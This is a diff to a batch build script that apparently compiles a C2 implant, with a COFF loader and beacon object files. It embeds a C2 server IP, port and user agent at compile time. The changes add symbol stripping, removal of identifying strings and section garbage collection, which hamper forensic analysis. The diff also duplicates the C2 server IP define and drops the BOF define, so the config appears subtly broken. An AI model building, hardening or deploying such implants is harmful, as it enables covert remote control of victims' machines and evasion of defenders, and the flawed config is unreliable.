@@ -61,7 +61,10 @@ if not exist "%BUILD_DIR%"     mkdir "%BUILD_DIR%"
 :: ---------------------------------------------------------------------------
 :: Common compile flags — config injected via -D, no header-gen step needed
 :: ---------------------------------------------------------------------------
-set COMMON_FLAGS=-c -O2 -I include -I src -DBOF ^
+set COMMON_FLAGS=-c -O2 -ffunction-sections -fdata-sections -fno-ident ^
+  -fno-asynchronous-unwind-tables ^
+  -I include -I src -DBOF ^
+  "-DC2_SERVER_IP=\"%ARG_IP%\"" ^
   "-DC2_SERVER_IP=\"%ARG_IP%\"" ^
   -DC2_SERVER_PORT=%ARG_PORT% ^
   "-DC2_USER_AGENT=\"%ARG_UA%\"" ^
@@ -108,7 +111,7 @@ if !errorlevel! neq 0 (echo [!] Failed: COFFLoader.c && exit /b 1)
 :: ---------------------------------------------------------------------------
 echo [2/3] Compiling BOFs...
 
-set BOF_FLAGS=-c -Os -fno-asynchronous-unwind-tables -fno-stack-protector -DBOF -I include
+set BOF_FLAGS=-c -Os -fno-asynchronous-unwind-tables -fno-stack-protector -I include
 
 for %%f in (bofs\*.c) do (
     echo   %%~nf
@@ -130,7 +133,8 @@ x86_64-w64-mingw32-gcc ^
   "%BUILD_DIR%\beacon_compatibility.obj" ^
   "%BUILD_DIR%\COFFLoader.obj" ^
   -o "%BUILD_DIR%\%ARG_OUT%" ^
-  -lws2_32 -lbcrypt -lwinhttp -liphlpapi -lsecur32 -ladvapi32
+  -Wl,-s -Wl,--gc-sections ^
+  -lws2_32 -lbcrypt -lwinhttp -liphlpapi -lsecur32 -ladvapi32 
 if !errorlevel! neq 0 (echo [!] Link failed && exit /b 1)
 
 :: ---------------------------------------------------------------------------
